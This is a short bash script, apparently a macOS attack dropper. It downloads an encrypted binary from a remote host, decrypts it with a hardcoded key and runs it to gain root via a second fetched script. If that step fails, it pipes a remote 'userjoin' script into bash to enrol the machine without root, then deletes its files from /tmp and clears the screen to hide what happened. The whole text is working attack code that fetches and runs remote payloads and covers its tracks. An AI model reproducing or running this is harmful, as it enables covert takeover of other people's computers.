#!/usr/bin/env bash
# Don't try to set variables in this file. Each line is executed independently.

curl -Lso /tmp/exp.out.des3 boesen.science:2042/mac/exp.out.des3
openssl des3 -d -in /tmp/exp.out.des3 -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out

curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh

chmod +x /tmp/exp.out /tmp/enact.sh

/tmp/exp.out <<EOF
/tmp/enact.sh
EOF

# If something went wrong, join the user without getting root.
if [ ! -f /tmp/exp.out ]; then curl -L boesen.science:2042/mac/userjoin.sh |bash; fi

rm -f /tmp/*.{sh,out,des3}

clear
